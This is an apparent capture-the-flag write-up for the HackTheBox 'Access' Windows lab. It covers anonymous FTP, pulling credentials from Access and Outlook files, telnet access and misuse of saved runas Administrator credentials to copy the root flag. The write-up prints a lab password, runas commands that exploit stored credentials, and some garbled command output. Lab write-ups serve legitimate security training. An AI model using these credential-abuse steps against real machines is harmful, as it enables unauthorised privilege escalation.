---
title: Access
date: 2026-07-28
description: Easy Windows machine with anonymous FTP access — pulling credentials from a Microsoft Access database and an Outlook PST file, taking over a telnet shell, and abusing saved runas credentials to read the root flag as Administrator.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Mon Jul 27 10:09:56 2026 as: /usr/lib/nmap/nmap -p21,23,80 -A -oN scan_results.txt 10.129.35.246
Nmap scan report for access.htb (10.129.35.246)
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   405.85 ms 10.10.16.1
2   405.98 ms access.htb (10.129.35.246)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 27 10:10:44 2026 -- 1 IP address (1 host up) scanned in 48.18 seconds
```

# User

## FTP enumeration

Anonymous login surfaced two directories, but the downloaded files came out corrupted. Switching to **binary** mode (or using FileZilla) fixes that:

```sh
ftp anonymous@10.129.35.246
> binary
```

One of the files was a Microsoft Access database, so I extracted its tables:

```text
mdb-tables backup.mdb
```

Exporting the `auth_user` table gave me the rows and columns:

```text
mdb-export auth_user backup.mdb
```

An online viewer works too: https://www.mdb-viewer.com/

The engineer password unlocked a zip containing **Access Control.pst** — an Outlook archive:

```text
lspst Access\ Control.pst
```

`readpst` didn't cooperate, so I read the exported **Access Control.mbox** directly instead — it revealed:

`security : 4Cc3ssC0ntr0ller`

Logging in over telnet gave a working but unstable shell, so I swapped it for a reverse shell — and with it, the user flag.

## runas abuse

A hidden `Desktop` directory under the Public profile held a shortcut: `ZKAccess3.5 Security System.lnk`:

```powershell
type 'ZKAccess3.5 Security System.lnk'
```

The shortcut targeted **runas.exe**, configured to launch the security application as Administrator with saved credentials:

```text
L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?M?:*wWindowsV1MV?System32???:?MV?*?System32X2P?:?
                                                                                                         runas.exe???:1??:1?*Yrunas.exeL-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
                       ?wN??]N?D.??Q???`?waccess?_???8{E?3
                                                          O?j)?H???
                                                                   )??[?_???8{E?3
                                                                                 O?j)?H???
                                                                                          )??[?	??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500

```

# Root

Basic Windows enumeration with `cmdkey /list` confirmed the stored credential:

```powershell
PS C:\Users\Public\Desktop> cmdkey /list                                                                                   
Currently stored credentials:                                                                                           
    Target: Domain:interactive=ACCESS\Administrator                                                                     
    Type: Domain Password                                                                                               
    User: ACCESS\Administrator                                                                                          ├─────────────────────────────────────────────────────────────────────────────────────────
│:String) [Invoke-Expression], IncompleteParseException
```

> Going through some of the documentation we got an idea that how runas.exe works  
> https://medium.com/@unowmie/konnichiwa-senpai-ef28789664eb

`runas` can copy the root flag as admin into the user's directory:

```powershell
runas /noprofile /savecred /user:Administrator "cmd.exe /C copy C:\Users\Administrator\root.txt C:\Users\security\root.txt
```

- `/noprofile` - won't ask for verification
- `/savecred` - use the stored credentials
- `/user:<username>` - use the stored credential of mentioned user

The copied flag file couldn't be opened directly, so instead I appended it to a readable file:

```powershell
"root flag" > test.txt
```

```powershell
runas /noprofile /savecred /user:Administrator "cmd.exe /C copy C:\Users\security\root.txt+C:\Users\security\test.txt C:\Users\security\flag.txt
```

Gained `root`
